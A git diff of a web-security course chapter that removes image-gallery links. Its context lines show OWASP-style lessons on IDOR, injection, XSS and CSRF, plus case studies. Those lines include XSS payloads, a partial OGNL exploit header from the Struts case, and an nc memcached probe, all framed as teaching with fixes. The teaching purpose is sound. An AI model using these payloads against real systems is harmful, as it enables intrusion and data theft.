@@ -52,17 +52,6 @@
 <!-- End Image Gallery -->
 
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/chapter-at-a-glance-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/chapter-at-a-glance-handwritten.svg" alt="Handwritten: Chapter at a Glance" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/chapter-at-a-glance-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/chapter-at-a-glance-diagram.svg" alt="Diagram: Chapter at a Glance" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/chapter-at-a-glance-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/chapter-at-a-glance-sticky.svg" alt="Sticky Note: Chapter at a Glance" width="30%">
-</a>
-
-
 | # | Section | Key Concept |
 
 |---|---------|-------------|
@@ -131,32 +120,12 @@
 **Technical Explanation:** The server fails to verify that the authenticated user owns the resource they request. Attackers manipulate id parameters, HTTP methods, or path traversal to access admin functions or other users data.
 ### Attack Steps (IDOR)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-idor-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-idor-handwritten.svg" alt="Handwritten: Attack Steps (IDOR)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-idor-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-idor-diagram.svg" alt="Diagram: Attack Steps (IDOR)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-idor-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-idor-sticky.svg" alt="Sticky Note: Attack Steps (IDOR)" width="30%">
-</a>
-
 
 1. User logs in — gets session cookie
 2. User clicks "My Profile" — browser sends GET /api/user/123
 3. Attacker changes 123 to 456 — GET /api/user/456
 4. Server returns user 456 data — no ownership check
 ### Vulnerable Code (Java Spring Boot)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-java-spring-boot-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-java-spring-boot-handwritten.svg" alt="Handwritten: Vulnerable Code (Java Spring Boot)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-java-spring-boot-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-java-spring-boot-diagram.svg" alt="Diagram: Vulnerable Code (Java Spring Boot)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-java-spring-boot-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-java-spring-boot-sticky.svg" alt="Sticky Note: Vulnerable Code (Java Spring Boot)" width="30%">
-</a>
 
 
 
@@ -172,16 +141,6 @@ public class UserController {
 ```
 
 ### Secure Code
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" alt="Handwritten: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" alt="Diagram: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" alt="Sticky Note: Secure Code" width="30%">
-</a>
 
 
 
@@ -199,16 +158,6 @@ public User getUser(@PathVariable Long id, Authentication auth) {
 
 ### Mitigation
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" alt="Handwritten: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" alt="Diagram: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" alt="Sticky Note: Mitigation" width="30%">
-</a>
-
 
 - Deny by default — every access check fails closed
 - Use centralized ACLs, not scattered if-checks
@@ -222,16 +171,6 @@ public User getUser(@PathVariable Long id, Authentication auth) {
 **Real-World Analogy:** A safe with a glass door.
 **Technical Explanation:** Sensitive data (passwords, credit cards, PII) is transmitted or stored without proper encryption. Includes weak TLS versions, missing HTTPS, hardcoded API keys, MD5/SHA-1 hashing.
 ### Common Failures
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-handwritten.svg" alt="Handwritten: Common Failures" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-diagram.svg" alt="Diagram: Common Failures" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/common-failures-sticky.svg" alt="Sticky Note: Common Failures" width="30%">
-</a>
 
 
 | Failure | Example | Risk |
@@ -250,16 +189,6 @@ public User getUser(@PathVariable Long id, Authentication auth) {
 
 ### Vulnerable Code
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-handwritten.svg" alt="Handwritten: Vulnerable Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-diagram.svg" alt="Diagram: Vulnerable Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-sticky.svg" alt="Sticky Note: Vulnerable Code" width="30%">
-</a>
-
 
 
 ```java
@@ -271,16 +200,6 @@ private static final String API_KEY = "sk-live-abc123";
 ```
 
 ### Secure Code
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" alt="Handwritten: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" alt="Diagram: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" alt="Sticky Note: Secure Code" width="30%">
-</a>
 
 
 
@@ -294,16 +213,6 @@ private static final String API_KEY = System.getenv("PAYMENT_API_KEY");
 
 ### Mitigation
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-handwritten.svg" alt="Handwritten: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-diagram.svg" alt="Diagram: Mitigation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/mitigation-sticky.svg" alt="Sticky Note: Mitigation" width="30%">
-</a>
-
 
 - Enforce TLS 1.2+ with HSTS
 - Use bcrypt/argon2/scrypt for passwords
@@ -315,16 +224,6 @@ private static final String API_KEY = System.getenv("PAYMENT_API_KEY");
 ## 3. Injection (A03)
 
 ### 3.1 SQL Injection
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-1-sql-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-1-sql-injection-handwritten.svg" alt="Handwritten: 3.1 SQL Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-1-sql-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-1-sql-injection-diagram.svg" alt="Diagram: 3.1 SQL Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-1-sql-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-1-sql-injection-sticky.svg" alt="Sticky Note: 3.1 SQL Injection" width="30%">
-</a>
 
 
 **Real-World Analogy:** A teller who reads your name from a slip, but also executes whatever else you write on it as a bank command.
@@ -435,16 +334,6 @@ cmd.Parameters.AddWithValue("@Id", userId);
 
 ### 3.2 NoSQL Injection
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-2-nosql-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-2-nosql-injection-handwritten.svg" alt="Handwritten: 3.2 NoSQL Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-2-nosql-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-2-nosql-injection-diagram.svg" alt="Diagram: 3.2 NoSQL Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-2-nosql-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-2-nosql-injection-sticky.svg" alt="Sticky Note: 3.2 NoSQL Injection" width="30%">
-</a>
-
 
 **Real-World Analogy:** Writing on a form in a language the interpreter understands differently than intended.
 **Technical Explanation:** MongoDB, Couchbase, etc. accept operators ($gt, $ne, $where) in JSON queries. Unfiltered input passes these operators through.
@@ -495,16 +384,6 @@ app.post('/login', (req, res) => {
 
 ### 3.3 OS Command Injection
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-3-os-command-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-3-os-command-injection-handwritten.svg" alt="Handwritten: 3.3 OS Command Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-3-os-command-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-3-os-command-injection-diagram.svg" alt="Diagram: 3.3 OS Command Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-3-os-command-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-3-os-command-injection-sticky.svg" alt="Sticky Note: 3.3 OS Command Injection" width="30%">
-</a>
-
 
 **Real-World Analogy:** A receptionist who reads your request aloud and also shouts whatever else you whisper.
 #### Vulnerable Code
@@ -540,16 +419,6 @@ ProcessBuilder pb = new ProcessBuilder("ping", ip);
 ```
 
 ### 3.4 LDAP Injection
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-4-ldap-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-4-ldap-injection-handwritten.svg" alt="Handwritten: 3.4 LDAP Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-4-ldap-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-4-ldap-injection-diagram.svg" alt="Diagram: 3.4 LDAP Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/3-4-ldap-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/3-4-ldap-injection-sticky.svg" alt="Sticky Note: 3.4 LDAP Injection" width="30%">
-</a>
 
 
 **Technical Explanation:** Attackers inject LDAP filter syntax to extract directory data.
@@ -591,16 +460,6 @@ String filter = "(uid=" + safe + ")";
 **Real-World Analogy:** A guestbook where writing malicious script makes every future visitor run your code.
 ### XSS Types Comparison
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-types-comparison-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-types-comparison-handwritten.svg" alt="Handwritten: XSS Types Comparison" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-types-comparison-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-types-comparison-diagram.svg" alt="Diagram: XSS Types Comparison" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-types-comparison-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-types-comparison-sticky.svg" alt="Sticky Note: XSS Types Comparison" width="30%">
-</a>
-
 
 | Property | Reflected XSS | Stored XSS | DOM-based XSS |
 
@@ -619,16 +478,6 @@ String filter = "(uid=" + safe + ")";
 | Example | ?q=<script>alert(1)&lt;/script&gt; | post=<script>fetch("/steal")&lt;/script&gt; | #<img src=x onerror=alert(1)> |
 
 ### 4.1 Reflected XSS
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-1-reflected-xss-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-1-reflected-xss-handwritten.svg" alt="Handwritten: 4.1 Reflected XSS" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-1-reflected-xss-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-1-reflected-xss-diagram.svg" alt="Diagram: 4.1 Reflected XSS" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-1-reflected-xss-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-1-reflected-xss-sticky.svg" alt="Sticky Note: 4.1 Reflected XSS" width="30%">
-</a>
 
 
 **Technical Explanation:** Server reflects user input in the response without encoding. Payload delivered via crafted URL.
@@ -675,16 +524,6 @@ public String search(@RequestParam String q, Model model) {
 
 ### 4.2 Stored XSS
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-2-stored-xss-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-2-stored-xss-handwritten.svg" alt="Handwritten: 4.2 Stored XSS" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-2-stored-xss-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-2-stored-xss-diagram.svg" alt="Diagram: 4.2 Stored XSS" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-2-stored-xss-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-2-stored-xss-sticky.svg" alt="Sticky Note: 4.2 Stored XSS" width="30%">
-</a>
-
 
 #### Attack Steps
 
@@ -728,16 +567,6 @@ def show_comments():
 ```
 
 ### 4.3 DOM-based XSS
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-3-dom-based-xss-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-3-dom-based-xss-handwritten.svg" alt="Handwritten: 4.3 DOM-based XSS" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-3-dom-based-xss-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-3-dom-based-xss-diagram.svg" alt="Diagram: 4.3 DOM-based XSS" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/4-3-dom-based-xss-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/4-3-dom-based-xss-sticky.svg" alt="Sticky Note: 4.3 DOM-based XSS" width="30%">
-</a>
 
 
 **Technical Explanation:** Vulnerability exists entirely in client-side JavaScript. Server never sees the payload.
@@ -784,16 +613,6 @@ document.getElementById('greeting').innerHTML = DOMPurify.sanitize(name);
 
 ### XSS Mitigation Layer Table
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-mitigation-layer-table-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-mitigation-layer-table-handwritten.svg" alt="Handwritten: XSS Mitigation Layer Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-mitigation-layer-table-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-mitigation-layer-table-diagram.svg" alt="Diagram: XSS Mitigation Layer Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-mitigation-layer-table-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-mitigation-layer-table-sticky.svg" alt="Sticky Note: XSS Mitigation Layer Table" width="30%">
-</a>
-
 
 | Layer | Defense | Bypass Risk |
 
@@ -818,16 +637,6 @@ document.getElementById('greeting').innerHTML = DOMPurify.sanitize(name);
 **Technical Explanation:** CSRF tricks an authenticated user into submitting a state-changing request (transfer funds, change email) without their consent. Browser automatically includes cookies.
 ### Attack Steps
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" alt="Handwritten: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" alt="Diagram: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" alt="Sticky Note: Attack Steps" width="30%">
-</a>
-
 
 1. Victim logs into bank.com (gets session cookie)
 2. Victim visits evil.com while still logged in
@@ -846,16 +655,6 @@ public String transfer(@RequestParam String to, @RequestParam int amount) {
 ```
 
 ### CSRF Payload Examples
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-payload-examples-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-payload-examples-handwritten.svg" alt="Handwritten: CSRF Payload Examples" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-payload-examples-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-payload-examples-diagram.svg" alt="Diagram: CSRF Payload Examples" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-payload-examples-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-payload-examples-sticky.svg" alt="Sticky Note: CSRF Payload Examples" width="30%">
-</a>
 
 
 
@@ -881,16 +680,6 @@ fetch("http://bank.com/transfer", {
 
 ### Protection Mechanisms
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/protection-mechanisms-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/protection-mechanisms-handwritten.svg" alt="Handwritten: Protection Mechanisms" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/protection-mechanisms-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/protection-mechanisms-diagram.svg" alt="Diagram: Protection Mechanisms" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/protection-mechanisms-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/protection-mechanisms-sticky.svg" alt="Sticky Note: Protection Mechanisms" width="30%">
-</a>
-
 
 | Mechanism | Description | Effectiveness |
 
@@ -907,16 +696,6 @@ fetch("http://bank.com/transfer", {
 | Re-authentication | Prompt password for sensitive actions | Very High |
 
 ### CSRF Token Implementation
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-token-implementation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-token-implementation-handwritten.svg" alt="Handwritten: CSRF Token Implementation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-token-implementation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-token-implementation-diagram.svg" alt="Diagram: CSRF Token Implementation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-token-implementation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csrf-token-implementation-sticky.svg" alt="Sticky Note: CSRF Token Implementation" width="30%">
-</a>
 
 
 
@@ -940,16 +719,6 @@ public String transfer(@RequestParam String _csrf, ...) {
 ## 17. Case Studies: Equifax, GitHub, Facebook, British Airways
 
 ### Case Study 1: Equifax 2017 → Apache Struts CVE-2017-5638
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-1-equifax-2017-apache-struts-cve-2017-5638-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-1-equifax-2017-apache-struts-cve-2017-5638-handwritten.svg" alt="Handwritten: Case Study 1: Equifax 2017 → Apache Struts CVE-2017-5638" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-1-equifax-2017-apache-struts-cve-2017-5638-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-1-equifax-2017-apache-struts-cve-2017-5638-diagram.svg" alt="Diagram: Case Study 1: Equifax 2017 → Apache Struts CVE-2017-5638" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-1-equifax-2017-apache-struts-cve-2017-5638-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-1-equifax-2017-apache-struts-cve-2017-5638-sticky.svg" alt="Sticky Note: Case Study 1: Equifax 2017 → Apache Struts CVE-2017-5638" width="30%">
-</a>
 
 
 **Attack Type:** OGNL Injection via Content-Type header (RCE)
@@ -981,16 +750,6 @@ Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER
 - WAF blocking OGNL patterns could prevent exploit
 ### Case Study 2: GitHub DDoS 2018 (Memcrashed)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-2-github-ddos-2018-memcrashed-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-2-github-ddos-2018-memcrashed-handwritten.svg" alt="Handwritten: Case Study 2: GitHub DDoS 2018 (Memcrashed)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-2-github-ddos-2018-memcrashed-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-2-github-ddos-2018-memcrashed-diagram.svg" alt="Diagram: Case Study 2: GitHub DDoS 2018 (Memcrashed)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-2-github-ddos-2018-memcrashed-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-2-github-ddos-2018-memcrashed-sticky.svg" alt="Sticky Note: Case Study 2: GitHub DDoS 2018 (Memcrashed)" width="30%">
-</a>
-
 
 **Attack Type:** Amplified DDoS via memcached UDP reflection
 **Impact:** 1.35 Tbps DDoS → largest at the time
@@ -1018,16 +777,6 @@ echo -e "stats\r\n" | nc -u vulnerable-memcached 11211
 - Use DDoS mitigation services (Cloudflare, Akamai)
 ### Case Study 3: Facebook 2019 SSRF
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-3-facebook-2019-ssrf-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-3-facebook-2019-ssrf-handwritten.svg" alt="Handwritten: Case Study 3: Facebook 2019 SSRF" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-3-facebook-2019-ssrf-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-3-facebook-2019-ssrf-diagram.svg" alt="Diagram: Case Study 3: Facebook 2019 SSRF" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-3-facebook-2019-ssrf-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-3-facebook-2019-ssrf-sticky.svg" alt="Sticky Note: Case Study 3: Facebook 2019 SSRF" width="30%">
-</a>
-
 
 **Attack Type:** SSRF in Facebook Graph API
 **Impact:** Internal server access
@@ -1045,16 +794,6 @@ echo -e "stats\r\n" | nc -u vulnerable-memcached 11211
 - Use random ephemeral hostnames to prevent DNS rebinding
 - Network segmentation: app tier should not have metadata access
 ### Case Study 4: British Airways 2018 → Magecart
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-4-british-airways-2018-magecart-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-4-british-airways-2018-magecart-handwritten.svg" alt="Handwritten: Case Study 4: British Airways 2018 → Magecart" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-4-british-airways-2018-magecart-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-4-british-airways-2018-magecart-diagram.svg" alt="Diagram: Case Study 4: British Airways 2018 → Magecart" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-4-british-airways-2018-magecart-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-4-british-airways-2018-magecart-sticky.svg" alt="Sticky Note: Case Study 4: British Airways 2018 → Magecart" width="30%">
-</a>
 
 
 **Attack Type:** Third-party JavaScript skimmer
@@ -1098,16 +837,6 @@ echo -e "stats\r\n" | nc -u vulnerable-memcached 11211
 
 ### Reconnaissance Phase
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/reconnaissance-phase-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/reconnaissance-phase-handwritten.svg" alt="Handwritten: Reconnaissance Phase" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/reconnaissance-phase-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/reconnaissance-phase-diagram.svg" alt="Diagram: Reconnaissance Phase" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/reconnaissance-phase-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/reconnaissance-phase-sticky.svg" alt="Sticky Note: Reconnaissance Phase" width="30%">
-</a>
-
 
 
 ```text
@@ -1128,16 +857,6 @@ echo -e "stats\r\n" | nc -u vulnerable-memcached 11211
 
 ### Exploitation Phase
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/exploitation-phase-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/exploitation-phase-handwritten.svg" alt="Handwritten: Exploitation Phase" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/exploitation-phase-diagram.svg" target="_blank" rel="noopener">
